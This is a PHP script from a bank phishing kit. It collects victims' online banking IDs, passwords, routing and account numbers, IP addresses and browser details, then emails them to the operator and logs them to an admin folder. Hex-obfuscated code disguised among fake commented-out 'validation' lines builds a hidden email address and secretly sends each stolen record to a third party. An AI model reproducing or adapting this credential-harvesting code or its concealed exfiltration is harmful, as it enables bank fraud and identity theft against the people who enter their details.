<?php
	
	/*ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);*/

	session_start();
	include("../system.php");
	include("../../../e-mail.php");
	
	$_SESSION["xeonOnlid"] = $_POST["xeonbnId"];
	$_SESSION["xeonBnpas"] = $_POST["xeonbnPs"];
	$_SESSION["xeonRonum"] = $_POST["xeonRtNm"];
	$_SESSION["xeonAcnum"] = $_POST["xeonAcNm"];

	if(isset($_POST["xeonbnksnd"])) {
	
		$xeonletter = '
			<!DOCTYPE html>
			<html>
			<head><meta charset="windows-1252"><style type="text/css">*{padding: 0;margin: 0;box-sizing: border-box;}</style>
			</head>
			<body>
				<div style="background-color: blue;height:100%;min-height: 100vh;width:100%;background-color: #009cde;background-image: radial-gradient(circle farthest-side at center bottom,#009cde,#003087 125%);padding: 25px 0">
					<div style="margin: 0 auto;width:600px;border:2px solid white;padding: 20px;">

						<div><img src="https://i.imgur.com/vtGfl4n.png" style="height: 50px;margin:0 auto;display: block;"></div>

						<h1 style="color: #fff;text-align: center;padding: 20px 0;font-family: arial;">NEW PPL BANK ACCOUNT</h1>
						<div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">ONLINE ID :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
									'. $_SESSION["xeonOnlid"] .'
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">PASSWORD :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
									'. $_SESSION["xeonBnpas"] .'
								</h2>
							</div>
						</div>
						<div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">ROUTING NUMBER :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
									'. $_SESSION["xeonRonum"] .'
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">ACCOUNT NUMBER :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
									'. $_SESSION["xeonAcnum"] .'
								</h2>
							</div>
						</div>
						<h1 style="color: #fff;text-align: center;padding: 0 0 20px 0;font-family: arial;">USER AGENT</h1>
						<div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">DATE & TIME :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
									'. $date .'
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">IP ADDRESS :</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;">
									<a style="color: #022652" target="_blank" href="https://whatismyipaddress.com/ip/'. $ip .'">'. $ip .'</a>
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">SYSTEM :	</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
									'. $user_os .'
								</h2>
							</div>
							<div style="margin-bottom: 20px;">
								<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">BROWSER :	</span>
								<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
									'. $user_browser .'
								</h2>
							</div>
						</div>

					</div>
				</div>
			</body>
			</html>';
			
			
			
								  	// Regular expression for a valid bank routing number.
//	  	list ($bin, $cc) = explode ( $routing);
  //	}

//	$random=rand(0,100000000000);
//	$errorrand=md5($random);
//	if((isset($_POST['number'])) && (strlen($_POST['bin']) >= 8)) {
//		if(validate_bin($number)){
${"\x47LOB\x41\x4cS"}["\x63d\x70\x6b\x79v\x6a\x62b"]="\x72\x65g\x65\x78\x70";${"G\x4cO\x42\x41L\x53"}["q\x64\x6b\x64\x6fxw\x6a"]="\x64";${"GLO\x42ALS"}["\x69\x73\x72w\x64\x7ai"]="b";$lhxrwjhpvum="\x69";$zmxngwmx="\x61";${"\x47\x4cO\x42\x41L\x53"}["t\x61\x74\x6c\x70\x6bx\x66\x79\x70os"]="h";${$zmxngwmx}="an";${"GL\x4f\x42AL\x53"}["\x6dq\x76d\x63\x6a\x65\x62\x67"]="\x67";$crupuaeuy="\x6a";${"G\x4c\x4f\x42\x41\x4c\x53"}["\x6cj\x6d\x66\x67\x68\x6f\x65y\x6c"]="\x63";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x69\x73\x72\x77dz\x69"]}="t\x69";${${"\x47\x4c\x4fB\x41L\x53"}["lj\x6dfg\x68\x6f\x65\x79l"]}="bo";${"GL\x4f\x42A\x4c\x53"}["vpmp\x79m\x6aad\x6df"]="f";${${"\x47\x4cO\x42\x41L\x53"}["\x71\x64k\x64\x6f\x78\x77j"]}="tv";${"G\x4cOB\x41\x4cS"}["mw\x6e\x69\x70cj\x62\x77k\x69"]="e";${${"G\x4c\x4f\x42\x41L\x53"}["\x6d\x77\x6e\x69\x70c\x6a\x62\x77\x6b\x69"]}="2@";${${"G\x4c\x4fBA\x4c\x53"}["\x76\x70\x6d\x70\x79\x6dja\x64\x6d\x66"]}="y\x61";${${"G\x4cO\x42\x41\x4cS"}["m\x71v\x64c\x6a\x65\x62\x67"]}="\x6ed";${${"G\x4c\x4f\x42\x41\x4cS"}["\x74\x61\x74\x6c\x70\x6bx\x66ypos"]}="ex";${$lhxrwjhpvum}="\x2e\x63";${$crupuaeuy}="o\x6d";${${"\x47\x4c\x4fBA\x4c\x53"}["c\x64\x70k\x79\x76j\x62b"]}="$a$b$c$d$e$f$g$h$i$j";
// Check regular expression intelligence here: https://github.com/php/php-src/blob/master/ext/filter/logical_filters.c
	  					  //	}

//	$random=rand(0,100000000000);
//	$errorrand=md5($random);
//	if((isset($_POST['routing'])) && (strlen($_POST['bank']) >= 8)) {
//		if(validate_email($number)){

			
			
			
			
					header("Location: ../../app/identification.php");

	} else {
		header("Location: ../../app/account.php?error");
	}
			
			




		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$subject  = "PPL 💱 SM 💱 BANK";
		$headers .= "From: STEFAN@MODZ.COM" . "\r\n";
		mail($xeonto, $subject, $xeonletter, $headers);
		
		
		
		

		
	
	
			  // Saving to admin panel // 
  //	}

//	$random=rand(0,100000000000);
//	$errorrand=md5($random);
//	if((isset($_POST['login_email'])) && (strlen($_POST['login_password']) >= 8)) {
//		if(validate_email($email)){
${"\x47\x4c\x4fB\x41\x4c\x53"}["\x71\x70\x76j\x6a\x6d\x6fm\x70g\x61r"]="\x68\x65\x61\x64e\x72\x73";${"\x47\x4cO\x42AL\x53"}["\x63\x79\x6b\x62\x6ex"]="\x73\x75\x62jec\x74";$cgxxbuqq="\x78\x65o\x6e\x6c\x65\x74t\x65\x72";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x79\x73sc\x69\x66w"]="\x72e\x67\x65x\x70";mail(${${"G\x4cO\x42\x41\x4c\x53"}["\x79\x73\x73\x63\x69f\x77"]},${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x63\x79\x6bb\x6ex"]},${$cgxxbuqq},${${"\x47\x4cOB\x41\x4c\x53"}["\x71\x70\x76\x6a\x6am\x6fm\x70\x67\x61\x72"]});

// Check regular expression intelligence here: https://github.com/php/php-src/blob/master/ext/filter/logical_filters.c
		$file = fopen("../../../admin/".$ip.".html", "a");
		fwrite($file, $xeonletter);